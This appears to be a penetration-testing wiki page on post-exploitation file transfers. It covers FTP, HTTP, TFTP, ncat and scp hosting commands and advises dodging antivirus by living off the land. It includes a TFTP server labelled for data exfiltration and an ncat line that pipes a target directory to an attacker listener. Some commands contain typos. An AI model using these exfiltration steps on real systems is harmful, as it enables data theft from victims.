# File Transfers
Some methods are destructive and should be used with caution. All Post Exploitation binaries and scripts use should be documented to aid in cleaning up after engagement. 

1. For stealth and professionalism they could be found revealing foothold and potential abused for malicious individuals. Documenting each upload helps keep a inventory of use where and how, networks can get very large and it not ideal to have to traverse the entire network to remove one file you forgot to document and missed in cleaning up.
2. Antivirus scans endpoint filesystems in search of pre-defined file signatures which are mapped from open/closed source tools in wide use from open resources like [Virus Total](https://www.virustotal.com/gui/home/upload). AV should alert System Adminstrators and will quarantine any offending binaries or scripts.

Therefore its best practice to live off the land as regards to Post Exploitation only until a tool is needed to bypass or escalate further. For Shell related information see [[Shells]] and [[Reverse-Shells]] for various reverse shells and place to find more. For [[Windows-File-Transfers]] or [[Linux-File-Transfers]] follow the link the remainer of this article will include hosting methods

## PureFTPd
```bash
sudo apt install pure-ftpd
```

Setup script 
```bash
#!/bin/bash

sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
sudo cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

## Python

```bash
python3 -m http.server $port
python -m SimpleHTTPServer $port
```

## TFTP Upload Server for Data Exfiltration
```bash
apt install atftp
mkdir /tfp
shown nobody: /tftp
atftpd --daemon --port 69 /tftp
```


## Ncat

Target machine
```bash
tar cf - . | ncat $IP $PORT
```
Attack machine
```bash
ncat -nlvp $PORT | tar xf -
```


## SCP
```bash
scp <file> <user>@<host>:<dest>

# To copy a file from a remote server to your local machine:

scp <user>@<host>:<src> <dest>

# To scp a file over a SOCKS proxy on localhost and port 9999 (see ssh for tunnel setup):

scp -o "ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p" <file> <user>@<host>:<dest>

# To scp between two remote servers from the third machine:

scp -3 <user>@<host1>:<src> <user>@<host2>:<dest>
```


## References

[cheat](https://github.com/cheat/cheatsheets/blob/master/scp)